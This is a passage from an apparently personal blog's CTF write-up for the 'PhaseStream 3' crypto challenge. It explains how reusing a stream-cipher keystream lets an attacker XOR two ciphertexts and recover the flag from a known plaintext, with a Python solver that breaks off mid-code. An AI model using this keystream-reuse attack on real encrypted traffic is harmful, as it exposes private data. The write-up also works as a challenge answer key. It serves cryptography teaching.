<div class="language-sh codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-sh codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token builtin class-name">echo</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">"No right of private conversation was enumerated in the Constitution. I don't suppose it occurred to anyone at the time that it could be prevented."</span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> xxd </span><span class="token parameter variable" style="color:#36acaa">-ps</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">tr</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-d</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">n </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">wc</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-c</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">294</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>Well, we have error of off by one, which is pretty common when counting with <code>wc</code>. But we can safely assume that this is the same string.</p>
<p>Which means that we have 2 encrypted strings using the same <strong>key</strong> and <strong>counter</strong>!</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="analysis">Analysis<a href="https://kblagoev.com/blog/phasestream-3-cyberapocalypse-2021-ctf#analysis" class="hash-link" aria-label="Direct link to Analysis" title="Direct link to Analysis">​</a></h3>
<p>Streaming cyphers are generally safe only if the key stream is only used once. Right now we have two cipher texts generated by the same keystream. Let's see what comes out of that.</p>
<span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msub><mi>C</mi><mn>1</mn></msub><mo>=</mo><msub><mi>P</mi><mn>1</mn></msub><mo>⊕</mo><mi>K</mi></mrow><annotation encoding="application/x-tex">C_1 = P_1 \oplus K</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em"><span style="top:-2.55em;margin-left:-0.0715em;margin-right:0.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222em"></span></span><span class="base"><span class="strut" style="height:0.6833em"></span><span class="mord mathnormal" style="margin-right:0.07153em">K</span></span></span></span></span>
<span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msub><mi>C</mi><mn>2</mn></msub><mo>=</mo><msub><mi>P</mi><mn>2</mn></msub><mo>⊕</mo><mi>K</mi></mrow><annotation encoding="application/x-tex">C_2 = P_2 \oplus K</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em"><span style="top:-2.55em;margin-left:-0.0715em;margin-right:0.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222em"></span></span><span class="base"><span class="strut" style="height:0.6833em"></span><span class="mord mathnormal" style="margin-right:0.07153em">K</span></span></span></span></span>
<p>We generate two ciphertexts <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>C</mi><mn>1</mn></msub><mtext>&nbsp;and&nbsp;</mtext><msub><mi>C</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">C_1 \text{ and } C_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8444em;vertical-align:-0.15em"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em"><span style="top:-2.55em;margin-left:-0.0715em;margin-right:0.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em"><span></span></span></span></span></span></span><span class="mord text"><span class="mord">&nbsp;and&nbsp;</span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em"><span style="top:-2.55em;margin-left:-0.0715em;margin-right:0.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em"><span></span></span></span></span></span></span></span></span></span> byt XORing the plaintexts <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>P</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>P</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">P_1,P_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em"><span></span></span></span></span></span></span></span></span></span> with the same keystream <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>K</mi></mrow><annotation encoding="application/x-tex">K</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em"></span><span class="mord mathnormal" style="margin-right:0.07153em">K</span></span></span></span>. If we now XOR the two ciphertexts together, we get</p>
<span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msub><mi>C</mi><mn>1</mn></msub><mo>⊕</mo><msub><mi>C</mi><mn>2</mn></msub><mo>=</mo><msub><mi>P</mi><mn>1</mn></msub><mo>⊕</mo><mi>K</mi><mo>⊕</mo><msub><mi>P</mi><mn>2</mn></msub><mo>⊕</mo><mi>K</mi><mtext>.</mtext></mrow><annotation encoding="application/x-tex">C_1 \oplus C_2 = P_1 \oplus K \oplus P_2 \oplus K \text{.}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em"><span style="top:-2.55em;margin-left:-0.0715em;margin-right:0.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222em"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em"><span style="top:-2.55em;margin-left:-0.0715em;margin-right:0.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222em"></span></span><span class="base"><span class="strut" style="height:0.7667em;vertical-align:-0.0833em"></span><span class="mord mathnormal" style="margin-right:0.07153em">K</span><span class="mspace" style="margin-right:0.2222em"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222em"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222em"></span></span><span class="base"><span class="strut" style="height:0.6833em"></span><span class="mord mathnormal" style="margin-right:0.07153em">K</span><span class="mord text"><span class="mord">.</span></span></span></span></span></span>
<p>But, because an XOR is its own inverse, we can use that <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>K</mi><mo>⊕</mo><mi>K</mi><mo>=</mo><mn>0</mn></mrow><annotation encoding="application/x-tex">K \oplus K = 0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7667em;vertical-align:-0.0833em"></span><span class="mord mathnormal" style="margin-right:0.07153em">K</span><span class="mspace" style="margin-right:0.2222em"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222em"></span></span><span class="base"><span class="strut" style="height:0.6833em"></span><span class="mord mathnormal" style="margin-right:0.07153em">K</span><span class="mspace" style="margin-right:0.2778em"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em"></span></span><span class="base"><span class="strut" style="height:0.6444em"></span><span class="mord">0</span></span></span></span>, so</p>
<span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msub><mi>C</mi><mn>1</mn></msub><mo>⊕</mo><msub><mi>C</mi><mn>2</mn></msub><mo>=</mo><msub><mi>P</mi><mn>1</mn></msub><mo>⊕</mo><msub><mi>P</mi><mn>2</mn></msub><mtext>,</mtext></mrow><annotation encoding="application/x-tex">C_1 \oplus C_2 = P_1 \oplus P_2 \text{,}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em"><span style="top:-2.55em;margin-left:-0.0715em;margin-right:0.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222em"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em"><span style="top:-2.55em;margin-left:-0.0715em;margin-right:0.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222em"></span></span><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em"><span></span></span></span></span></span></span><span class="mord text"><span class="mord">,</span></span></span></span></span></span>
<p>meaning that we simply have the two plaintexts XORed with each-other. This is completely reversible! If we know one of the plaintexts, we can XOR the value we have from above with that plaintext, and get the other!</p>
<span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msub><mi>C</mi><mn>1</mn></msub><mo>⊕</mo><msub><mi>C</mi><mn>2</mn></msub><mo>⊕</mo><msub><mi>P</mi><mn>1</mn></msub><mo>=</mo><msub><mi>P</mi><mn>1</mn></msub><mo>⊕</mo><msub><mi>P</mi><mn>2</mn></msub><mo>⊕</mo><msub><mi>P</mi><mn>1</mn></msub><mo>=</mo><msub><mi>P</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">C_1 \oplus C_2 \oplus P_1 = P_1 \oplus P_2 \oplus P_1 = P_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em"><span style="top:-2.55em;margin-left:-0.0715em;margin-right:0.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222em"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em"><span style="top:-2.55em;margin-left:-0.0715em;margin-right:0.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222em"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222em"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222em"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em"><span></span></span></span></span></span></span></span></span></span></span>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="solution">Solution<a href="https://kblagoev.com/blog/phasestream-3-cyberapocalypse-2021-ctf#solution" class="hash-link" aria-label="Direct link to Solution" title="Direct link to Solution">​</a></h3>
<p>Well, we have the two ciphertexts, and we have one of the plaintexts. So our solution is to</p>
<ol>
<li>XOR the two output values with each-other.</li>
<li>XOR the plaintext <code>No right of private conversation was</code> with the XOR result from <code>1</code>.</li>
<li>Get the flag</li>
</ol>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic">#!/usr/bin/env python3</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ciphertext1 </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">'464851522838603926f4422a4ca6d81b02f351b454e6f968a324fcc77da30cf979eec57c8675de3bb92f6c21730607066226780a8d4539fcf67f9f5589d150a6c7867140b5a63de2971dc209f480c270882194f288167ed910b64cf627ea6392456fa1b648afd0b239b59652baedc595d4f87634cf7ec4262f8c9581d7f56dc6f836cfe696518ce434ef4616431d4d1b361c'</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ciphertext2 </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">'4b6f25623a2d3b3833a8405557e7e83257d360a054c2ea'</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">plaintext </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">b'No right of private conversation was enumerated in the Constitution. I don\'t suppose it occurred to anyone at the time that it could be prevented.'</span><span class="token punctuation" style="color:#393A34">.</span><span class="token builtin">hex</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">def</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">xor</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">hex1</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> hex2</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> getAscii </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token boolean" style="color:#36acaa">False</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  result </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">[</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> ind </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> </span><span class="token builtin">range</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token builtin">len</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">hex1</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">2</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    longIndex </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> ind</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    shortIndex </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> ind</span><span class="token operator" style="color:#393A34">%</span><span class="token builtin">len</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">hex2</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    hexChar1 </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> hex1</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">longIndex</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain">longIndex</span><span class="token operator" style="color:#393A34">+</span><span class="token number" style="color:#36acaa">2</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    byte1 </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token builtin">int</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">hexChar1</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">16</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    hexChar2 </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> hex2</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">shortIndex</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain">shortIndex</span><span class="token operator" style="color:#393A34">+</span><span class="token number" style="color:#36acaa">2</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    byte2 </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token builtin">int</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">hexChar2</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">16</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    asciiNum </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> byte1 </span><span class="token operator" style="color:#393A34">^</span><span class="token plain"> byte2</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    result</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">append</span><span class="token punctuation" style="color:#393A34">(</span><span class="token builtin">chr</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">asciiNum</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" 